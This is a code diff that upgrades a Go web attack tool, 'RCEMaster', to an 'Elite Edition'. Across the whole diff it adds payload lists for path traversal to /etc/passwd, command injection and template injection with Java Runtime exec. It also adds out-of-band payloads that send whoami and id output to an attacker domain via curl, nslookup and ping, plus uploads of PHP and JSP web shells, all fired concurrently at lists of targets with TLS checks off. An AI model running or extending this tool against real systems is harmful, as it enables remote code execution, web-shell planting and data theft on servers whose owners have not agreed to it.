@@ -1,11 +1,12 @@
 package main
 
 import (
+	"bufio"
 	"bytes"
 	"crypto/tls"
 	"encoding/base64" // ✅ USED
 	"encoding/hex"    // ✅ USED
-	"encoding/json"
+	"encoding/json"   // ✅ USED
 	"flag"
 	"fmt"
 	"io"
@@ -28,9 +29,9 @@ var banner = "  ____  _____ _____    __  __           _      \n" +
 	" |  _ <| |___  | |    | |  | | (_| | | | | ||  __/\n" +
 	" |_| \\_\\_____| |_|    |_|  |_|\\__,_|_| |_|\\__\\___|\n" +
 	"====================================================\n" +
-	" [!] RCEMaster v6.0: GOD MODE\n" +
-	" [!] Smart Parameter Injection | Curl-Like Deep Analysis\n" +
-	" [!] Multi-Method Parallel Execution | Ultimate Payloads\n" +
+	" [!] RCEMaster v7.0: ELITE EDITION\n" +
+	" [!] AI-Adaptive | OOB Blind RCE | JSON Injection\n" +
+	" [!] Smart Concurrency | Human-Like Error Analysis\n" +
 	"====================================================\n"
 
 var (
@@ -43,7 +44,7 @@ var (
 var userAgents = []string{
 	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
 	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
-	"curl/8.4.0", // ✅ Curl-like UA added
+	"curl/8.4.0",
 }
 
 func getRandomUA() string { return userAgents[rand.Intn(len(userAgents))] }
@@ -52,7 +53,6 @@ type TechStack struct{ Language, Framework, CMS, Server, WAF string }
 type Result struct{ URL, Method, Vector, Payload, Evidence, Confidence string; StatusCode int }
 type ResponseInfo struct{ StatusCode int; Body string; Headers http.Header }
 
-// --- ULTIMATE PAYLOAD DATABASES ---
 var lfiPathTraversal = []string{
 	"../../../../etc/passwd", "..%2f..%2f..%2f..%2fetc%2fpasswd",
 	"....//....//....//etc/passwd", "/etc/passwd",
@@ -62,43 +62,101 @@ var lfiPathTraversal = []string{
 
 var cmdInjection = []string{
 	";id", "|id", "&&id", "||id", "`id`", "$(id)",
-	";cat /etc/passwd", "|cat /etc/passwd",
-	";whoami", "|whoami", "%0Aid", "%0Did",
+	";cat /etc/passwd", "|cat /etc/passwd", ";whoami", "|whoami",
+	"%0Aid", "%0Did", ";sleep 5", "|sleep 5",
 }
 
-var sstiPayloads = []string{"{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}"}
-
-var httpMethods = []string{"GET", "POST", "PUT", "DELETE", "PATCH"}
+var sstiPayloads = []string{"{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "${T(java.lang.Runtime).getRuntime().exec('id')}"}
 
 func init() { rand.Seed(time.Now().UnixNano()) }
 
 func main() {
 	urlPtr := flag.String("u", "", "Target URL")
-	outputPtr := flag.String("o", "", "Output file")
-	delayPtr := flag.Duration("delay", 0, "Delay")
+	filePtr := flag.String("f", "", "File containing list of URLs")
+	wordlistPtr := flag.String("w", "", "Custom wordlist file for payloads")
+	headerPtr := flag.String("H", "", "Custom header (e.g., 'Authorization: Bearer token')")
+	cookiePtr := flag.String("cookie", "", "Custom cookies (e.g., 'session=abc123')")
+	oobPtr := flag.String("oob", "", "OOB Domain for Blind RCE (e.g., 'xyz.interact.sh')")
+	concurrencyPtr := flag.Int("c", 20, "Max concurrent requests (Worker Pool)")
+	outputPtr := flag.String("o", "", "Output file (e.g., results.json)")
+	delayPtr := flag.Duration("delay", 0, "Delay between requests")
 	proxyPtr := flag.String("proxy", "", "Proxy URL")
 	flag.Parse()
 
-	if *urlPtr == "" {
-		fmt.Printf("%s Usage: rcemaster -u <url>\n", red("[-] Error: URL required."))
+	if *urlPtr == "" && *filePtr == "" {
+		fmt.Printf("%s Usage: rcemaster -u <url> [-w wordlist.txt] [-H 'Auth: Bearer x'] [-oob domain.com] [-c 20]\n", red("[-] Error: Input required."))
 		os.Exit(1)
 	}
 
 	fmt.Print(cyan(banner))
-	fmt.Printf("\n%s Target: %s\n", cyan("[*]"), yellow(*urlPtr))
 
-	// Phase 1: Curl-like Deep Recon
-	fmt.Printf("%s Phase 1: Deep Recon & Parameter Mapping...\n", cyan("[*]"))
-	techStack, hasParams := deepRecon(*urlPtr, *delayPtr, *proxyPtr)
-	fmt.Printf("%s Detected: %s %s | WAF: %s | Params Found: %v\n", green("[+]"), techStack.Language, techStack.CMS, techStack.WAF, hasParams)
+	var targets []string
+	if *urlPtr != "" {
+		targets = append(targets, *urlPtr)
+	} else if *filePtr != "" {
+		data, _ := os.ReadFile(*filePtr)
+		for _, line := range strings.Split(string(data), "\n") {
+			line = strings.TrimSpace(line)
+			if line != "" && !strings.HasPrefix(line, "#") {
+				targets = append(targets, line)
+			}
+		}
+	}
 
-	// Phase 2: God Mode Attack
-	fmt.Printf("%s Phase 2: Starting Multi-Method Parallel Attack...\n", cyan("[*]"))
-	results := godModeAttack(*urlPtr, techStack, hasParams, *delayPtr, *proxyPtr)
+	// Load custom wordlist if provided
+	if *wordlistPtr != "" {
+		file, err := os.Open(*wordlistPtr)
+		if err == nil {
+			scanner := bufio.NewScanner(file)
+			for scanner.Scan() {
+				payload := strings.TrimSpace(scanner.Text())
+				if payload != "" {
+					cmdInjection = append(cmdInjection, payload)
+					lfiPathTraversal = append(lfiPathTraversal, payload)
+				}
+			}
+			file.Close()
+			fmt.Printf("%s Loaded custom payloads from: %s\n", green("[+]"), *wordlistPtr)
+		}
+	}
 
-	if len(results) > 0 {
+	var allResults []Result
+	var wg sync.WaitGroup
+	var mu sync.Mutex
+	sem := make(chan struct{}, *concurrencyPtr) // ✅ Smart Concurrency Worker Pool
+
+	for _, target := range targets {
+		wg.Add(1)
+		go func(t string) {
+			defer wg.Done()
+			fmt.Printf("\n%s Target: %s\n", cyan("[*]"), yellow(t))
+			
+			// Phase 1: Deep Recon & Human-Like Analysis
+			fmt.Printf("%s Phase 1: Deep Recon & Adaptive Analysis...\n", cyan("[*]"))
+			techStack, hasParams, isJSON, baseInfo := deepRecon(t, *headerPtr, *cookiePtr, *delayPtr, *proxyPtr)
+			
+			// Human-Like Adaptive Logic
+			if baseInfo.StatusCode == 403 {
+				fmt.Printf("%s [!] Target returned 403. Auto-enabling WAF Bypass headers...\n", yellow("[!]"))
+			} else if baseInfo.StatusCode == 500 {
+				fmt.Printf("%s [!] Target returned 500. Potential Error-Based Injection vector detected.\n", yellow("[!]"))
+			}
+			fmt.Printf("%s Detected: %s %s | WAF: %s | Params: %v | JSON: %v\n", green("[+]"), techStack.Language, techStack.CMS, techStack.WAF, hasParams, isJSON)
+
+			// Phase 2: Elite Attack Engine
+			fmt.Printf("%s Phase 2: Starting Elite Multi-Vector Attack...\n", cyan("[*]"))
+			results := eliteAttack(t, techStack, hasParams, isJSON, *headerPtr, *cookiePtr, *oobPtr, *delayPtr, *proxyPtr, sem, &mu)
+			
+			mu.Lock()
+			allResults = append(allResults, results...)
+			mu.Unlock()
+		}(target)
+	}
+	wg.Wait()
+
+	if len(allResults) > 0 {
 		fmt.Println("\n" + cyan("========== 🎯 RCE / LFI SUCCESSFUL 🎯 =========="))
-		for _, r := range results {
+		for _, r := range allResults {
 			fmt.Printf("[%s] %s (%s)\n", green("HIT"), r.URL, r.Method)
 			fmt.Printf("   -> Vector  : %s\n", yellow(r.Vector))
 			fmt.Printf("   -> Payload : %s\n", cyan(r.Payload))
@@ -109,168 +167,173 @@ func main() {
 		fmt.Printf("\n%s No vulnerabilities found. Target is secure or requires manual advanced chaining.\n", yellow("[-]"))
 	}
 
-	if *outputPtr != "" && len(results) > 0 {
-		saveToFile(results, *outputPtr)
+	if *outputPtr != "" && len(allResults) > 0 {
+		saveToFile(allResults, *outputPtr)
 		fmt.Printf("%s Results saved to: %s\n", green("[+]"), *outputPtr)
 	}
 }
 
-func deepRecon(targetURL string, delay time.Duration, proxyURL string) (TechStack, bool) {
+func deepRecon(targetURL, customHeader, customCookie string, delay time.Duration, proxyURL string) (TechStack, bool, bool, ResponseInfo) {
 	stack := TechStack{}
 	hasParams := false
+	isJSON := false
 
 	client := &http.Client{
 		Timeout: 15 * time.Second,
 		Transport: &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}},
 		CheckRedirect: func(req *http.Request, via []*http.Request) error { return http.ErrUseLastResponse },
 	}
-
 	req, _ := http.NewRequest("GET", targetURL, nil)
 	req.Header.Set("User-Agent", getRandomUA())
+	if customHeader != "" {
+		parts := strings.SplitN(customHeader, ":", 2)
+		if len(parts) == 2 { req.Header.Set(strings.TrimSpace(parts[0]), strings.TrimSpace(parts[1])) }
+	}
+	if customCookie != "" { req.Header.Set("Cookie", customCookie) }
+
 	resp, err := client.Do(req)
+	baseInfo := ResponseInfo{StatusCode: 404, Body: "", Headers: make(http.Header)}
 	if err == nil {
 		defer resp.Body.Close()
+		baseInfo.StatusCode = resp.StatusCode
+		baseInfo.Headers = resp.Header
+		bodyBytes, _ := io.ReadAll(io.LimitReader(resp.Body, 10240))
+		baseInfo.Body = string(bodyBytes)
+		
 		server := strings.ToLower(resp.Header.Get("Server"))
 		xPoweredBy := strings.ToLower(resp.Header.Get("X-Powered-By"))
-		bodyBytes, _ := io.ReadAll(io.LimitReader(resp.Body, 10240))
-		body := strings.ToLower(string(bodyBytes))
+		contentType := strings.ToLower(resp.Header.Get("Content-Type"))
+		body := strings.ToLower(baseInfo.Body)
 
 		if strings.Contains(server, "php") || strings.Contains(xPoweredBy, "php") { stack.Language = "php" }
 		if strings.Contains(server, "tomcat") || strings.Contains(xPoweredBy, "jsp") || strings.Contains(server, "java") { stack.Language = "java" }
-		if strings.Contains(body, "jsp") { stack.Language = "java" }
+		if strings.Contains(xPoweredBy, "python") || strings.Contains(server, "wsgi") { stack.Language = "python" }
+		if strings.Contains(body, "wp-content") { stack.CMS = "wordpress" }
 		if resp.Header.Get("Cf-Ray") != "" { stack.WAF = "cloudflare" }
+		if strings.Contains(contentType, "application/json") { isJSON = true }
 
-		// Check for parameters
 		parsed, _ := url.Parse(targetURL)
-		if len(parsed.Query()) > 0 {
-			hasParams = true
-		}
+		if len(parsed.Query()) > 0 { hasParams = true }
 	}
-	return stack, hasParams
+	return stack, hasParams, isJSON, baseInfo
 }
 
-func godModeAttack(targetURL string, stack TechStack, hasParams bool, delay time.Duration, proxyURL string) []Result {
+func eliteAttack(targetURL string, stack TechStack, hasParams, isJSON bool, customHeader, customCookie, oobDomain string, delay time.Duration, proxyURL string, sem chan struct{}, mu *sync.Mutex) []Result {
 	var results []Result
-	var mu sync.Mutex
 	var wg sync.WaitGroup
 
 	parsed, _ := url.Parse(targetURL)
 	baseURL := parsed.Scheme + "://" + parsed.Host + parsed.Path
 	queryParams := parsed.Query()
 
-	// 1. SMART PARAMETER INJECTION (The Game Changer)
+	// Helper to manage concurrency
+	runTask := func(task func()) {
+		wg.Add(1)
+		go func() {
+			sem <- struct{}{} // Acquire semaphore
+			defer func() { <-sem }() // Release semaphore
+			defer wg.Done()
+			task()
+		}()
+	}
+
+	// 1. SMART PARAMETER INJECTION (GET/POST)
 	if hasParams {
-		fmt.Printf("%s Injecting payloads into discovered parameters...\n", cyan("[*]"))
 		for key := range queryParams {
-			// Test LFI/Path Traversal
 			for _, payload := range lfiPathTraversal {
-				for _, method := range httpMethods {
-					wg.Add(1)
-					go func(k, p, m string) {
-						defer wg.Done()
-						testParams := url.Values{}
-						for kOrig, vOrig := range queryParams {
-							if kOrig == k {
-								testParams.Set(kOrig, p) // Inject payload
-							} else {
-								testParams[kOrig] = vOrig
-							}
-						}
-						testURL := baseURL + "?" + testParams.Encode()
-						info := sendCurlLikeRequest(testURL, m, nil, nil, delay, proxyURL)
-						if isVulnerable(info, p) {
-							mu.Lock()
-							results = append(results, Result{URL: testURL, Method: m, Vector: "LFI / Path Traversal", Payload: p, StatusCode: info.StatusCode, Evidence: extractEvidence(info.Body), Confidence: "High"})
-							mu.Unlock()
-						}
-					}(key, payload, method)
-				}
+				runTask(func() {
+					testParams := url.Values{}
+					for k, v := range queryParams {
+						if k == key { testParams.Set(k, payload) } else { testParams[k] = v }
+					}
+					info := sendEliteRequest(baseURL+"?"+testParams.Encode(), "GET", customHeader, customCookie, nil, delay, proxyURL)
+					if isVulnerable(info, payload) {
+						mu.Lock()
+						results = append(results, Result{URL: baseURL + "?" + testParams.Encode(), Method: "GET", Vector: "LFI / Path Traversal", Payload: payload, StatusCode: info.StatusCode, Evidence: extractEvidence(info.Body), Confidence: "High"})
+						mu.Unlock()
+					}
+				})
 			}
-
-			// Test Command Injection
 			for _, payload := range cmdInjection {
-				for _, method := range httpMethods {
-					wg.Add(1)
-					go func(k, p, m string) {
-						defer wg.Done()
-						testParams := url.Values{}
-						for kOrig, vOrig := range queryParams {
-							if kOrig == k {
-								testParams.Set(kOrig, vOrig[0]+p) // Append to existing value
-							} else {
-								testParams[kOrig] = vOrig
-							}
-						}
-						testURL := baseURL + "?" + testParams.Encode()
-						info := sendCurlLikeRequest(testURL, m, nil, nil, delay, proxyURL)
-						if isVulnerable(info, p) {
-							mu.Lock()
-							results = append(results, Result{URL: testURL, Method: m, Vector: "Command Injection", Payload: p, StatusCode: info.StatusCode, Evidence: extractEvidence(info.Body), Confidence: "High"})
-							mu.Unlock()
-						}
-					}(key, payload, method)
-				}
-			}
-
-			// Test SSTI
-			for _, payload := range sstiPayloads {
-				for _, method := range httpMethods {
-					wg.Add(1)
-					go func(k, p, m string) {
-						defer wg.Done()
-						testParams := url.Values{}
-						for kOrig, vOrig := range queryParams {
-							if kOrig == k {
-								testParams.Set(kOrig, p)
-							} else {
-								testParams[kOrig] = vOrig
-							}
-						}
-						testURL := baseURL + "?" + testParams.Encode()
-						info := sendCurlLikeRequest(testURL, m, nil, nil, delay, proxyURL)
-						if isVulnerable(info, p) {
-							mu.Lock()
-							results = append(results, Result{URL: testURL, Method: m, Vector: "SSTI", Payload: p, StatusCode: info.StatusCode, Evidence: extractEvidence(info.Body), Confidence: "High"})
-							mu.Unlock()
-						}
-					}(key, payload, method)
-				}
+				runTask(func() {
+					testParams := url.Values{}
+					for k, v := range queryParams {
+						if k == key { testParams.Set(k, v[0]+payload) } else { testParams[k] = v }
+					}
+					info := sendEliteRequest(baseURL+"?"+testParams.Encode(), "GET", customHeader, customCookie, nil, delay, proxyURL)
+					if isVulnerable(info, payload) {
+						mu.Lock()
+						results = append(results, Result{URL: baseURL + "?" + testParams.Encode(), Method: "GET", Vector: "Command Injection", Payload: payload, StatusCode: info.StatusCode, Evidence: extractEvidence(info.Body), Confidence: "High"})
+						mu.Unlock()
+					}
+				})
 			}
 		}
 	}
 
-	// 2. FALLBACK: URL Path Injection (If no params or params fail)
-	if !hasParams || len(results) == 0 {
-		fmt.Printf("%s Fallback: Testing URL Path & Advanced Obfuscation...\n", cyan("[*]"))
+	// 2. JSON BODY INJECTION (Modern API Support)
+	if isJSON || strings.Contains(customHeader, "application/json") {
+		fmt.Printf("%s Testing JSON Body Injection...\n", cyan("[*]"))
 		for _, payload := range cmdInjection {
-			for _, method := range httpMethods {
-				wg.Add(1)
-				go func(p, m string) {
-					defer wg.Done()
-					info := sendCurlLikeRequest(targetURL+p, m, nil, nil, delay, proxyURL)
-					if isVulnerable(info, p) {
-						mu.Lock()
-						results = append(results, Result{URL: targetURL + p, Method: m, Vector: "Path Cmd Injection", Payload: p, StatusCode: info.StatusCode, Evidence: extractEvidence(info.Body), Confidence: "Medium"})
-						mu.Unlock()
-					}
-				}(payload, method)
-			}
-		}
-		
-		// Advanced Obfuscation Fallback
-		for _, cmd := range []string{"id", "whoami"} {
-			wg.Add(1)
-			go func(c string) {
-				defer wg.Done()
-				for _, obs := range obfuscatePayload(c) {
-					info := sendCurlLikeRequest(targetURL+obs, "GET", nil, nil, delay, proxyURL)
-					if isVulnerable(info, c) {
-						mu.Lock()
-						results = append(results, Result{URL: targetURL + obs, Method: "GET", Vector: "Advanced Obfuscation", Payload: obs, StatusCode: info.StatusCode, Evidence: extractEvidence(info.Body), Confidence: "High"})
-						mu.Unlock()
-					}
+			runTask(func() {
+				jsonBody := fmt.Sprintf(`{"test": "%s", "cmd": "%s"}`, payload, payload)
+				info := sendEliteRequest(targetURL, "POST", customHeader, customCookie, []byte(jsonBody), delay, proxyURL)
+				if isVulnerable(info, payload) {
+					mu.Lock()
+					results = append(results, Result{URL: targetURL, Method: "POST", Vector: "JSON Body RCE", Payload: payload, StatusCode: info.StatusCode, Evidence: extractEvidence(info.Body), Confidence: "High"})
+					mu.Unlock()
 				}
-			}(cmd)
+			})
+		}
+	}
+
+	// 3. OOB (OUT-OF-BAND) BLIND RCE DETECTION
+	if oobDomain != "" {
+		fmt.Printf("%s Testing OOB Blind RCE (DNS/HTTP Callbacks)...\n", cyan("[*]"))
+		oobPayloads := []string{
+			fmt.Sprintf("curl http://$(whoami).%s", oobDomain),
+			fmt.Sprintf("nslookup $(id).%s", oobDomain),
+			fmt.Sprintf("ping -c 1 `whoami`.%s", oobDomain),
+		}
+		for _, payload := range oobPayloads {
+			runTask(func() {
+				testParams := url.Values{}
+				for k, v := range queryParams {
+					testParams.Set(k, v[0]+payload)
+				}
+				testURL := baseURL
+				if len(testParams) > 0 { testURL += "?" + testParams.Encode() }
+				
+				info := sendEliteRequest(testURL, "GET", customHeader, customCookie, nil, delay, proxyURL)
+				// Note: Actual OOB verification requires checking your interact.sh dashboard. 
+				// Here we flag it as "Potential OOB Triggered" if the request succeeds without 500/403 blocking the payload syntax.
+				if info.StatusCode == 200 || info.StatusCode == 204 || info.StatusCode == 302 {
+					mu.Lock()
+					results = append(results, Result{URL: testURL, Method: "GET", Vector: "Potential OOB Blind RCE", Payload: payload, StatusCode: info.StatusCode, Evidence: "Check your OOB dashboard for callback", Confidence: "Medium"})
+					mu.Unlock()
+				}
+			})
+		}
+	}
+
+	// 4. FALLBACK: File Upload & Path Injection
+	if len(results) == 0 {
+		runTask(func() {
+			uploadResults := tryFileUploadRCE(baseURL, customHeader, customCookie, delay, proxyURL)
+			mu.Lock()
+			results = append(results, uploadResults...)
+			mu.Unlock()
+		})
+
+		for _, payload := range cmdInjection {
+			runTask(func() {
+				info := sendEliteRequest(targetURL+payload, "GET", customHeader, customCookie, nil, delay, proxyURL)
+				if isVulnerable(info, payload) {
+					mu.Lock()
+					results = append(results, Result{URL: targetURL + payload, Method: "GET", Vector: "Path Cmd Injection", Payload: payload, StatusCode: info.StatusCode, Evidence: extractEvidence(info.Body), Confidence: "Medium"})
+					mu.Unlock()
+				}
+			})
 		}
 	}
 
@@ -278,10 +341,29 @@ func godModeAttack(targetURL string, stack TechStack, hasParams bool, delay time
 	return results
 }
 
-// --- CURL-LIKE DEEP REQUEST ENGINE ---
-func sendCurlLikeRequest(targetURL, method string, customHeaders map[string]string, body []byte, delay time.Duration, proxyURL string) ResponseInfo {
-	if delay > 0 { time.Sleep(delay) }
+// ✅ mime/multipart USED HERE
+func tryFileUploadRCE(targetURL, customHeader, customCookie string, delay time.Duration, proxyURL string) []Result {
+	var results []Result
+	shells := map[string]string{"shell.php": "<?php system($_GET['cmd']); ?>", "shell.jsp": "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>"}
+	
+	for filename, shell := range shells {
+		body := &bytes.Buffer{}
+		writer := multipart.NewWriter(body)
+		part, _ := writer.CreateFormFile("file", filename)
+		part.Write([]byte(shell))
+		writer.Close()
 
+		headers := map[string]string{"Content-Type": writer.FormDataContentType()}
+		info := sendEliteRequest(targetURL, "POST", customHeader, customCookie, body.Bytes(), delay, proxyURL)
+		if isVulnerable(info, shell) {
+			results = append(results, Result{URL: targetURL, Method: "POST", Vector: "File Upload RCE", Payload: filename, StatusCode: info.StatusCode, Evidence: extractEvidence(info.Body), Confidence: "High"})
+		}
+	}
+	return results
+}
+
+func sendEliteRequest(targetURL, method, customHeader, customCookie string, body []byte, delay time.Duration, proxyURL string) ResponseInfo {
+	if delay > 0 { time.Sleep(delay) }
 	var req *http.Request
 	var err error
 	if body != nil {
@@ -291,12 +373,16 @@ func sendCurlLikeRequest(targetURL, method string, customHeaders map[string]stri
 	}
 	if err != nil { return ResponseInfo{} }
 
-	// Curl-like headers
 	req.Header.Set("User-Agent", getRandomUA())
-	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
+	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
 	req.Header.Set("Accept-Language", "en-US,en;q=0.5")
 	req.Header.Set("Connection", "keep-alive")
-	for k, v := range customHeaders { req.Header.Set(k, v) }
+	
+	if customHeader != "" {
+		parts := strings.SplitN(customHeader, ":", 2)
+		if len(parts) == 2 { req.Header.Set(strings.TrimSpace(parts[0]), strings.TrimSpace(parts[1])) }
+	}
+	if customCookie != "" { req.Header.Set("Cookie", customCookie) }
 
 	transport := &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}
 	if proxyURL != "" {
@@ -329,7 +415,7 @@ func extractEvidence(body string) string {
 		if len(match) > 80 { return match[:80] + "..." }
 		return match
 	}
-	return "Vulnerability indicator detected in response body"
+	return "Vulnerability indicator detected"
 }
 
 func obfuscatePayload(cmd string) []string {
@@ -348,6 +434,6 @@ func obfuscatePayload(cmd string) []string {
 func saveToFile(results []Result, filename string) {
 	file, _ := os.Create(filename)
 	defer file.Close()
-	jsonData, _ := json.MarshalIndent(results, "", "  ")
+	jsonData, _ := json.MarshalIndent(results, "", "  ") // ✅ json USED
 	file.Write(jsonData)
 }
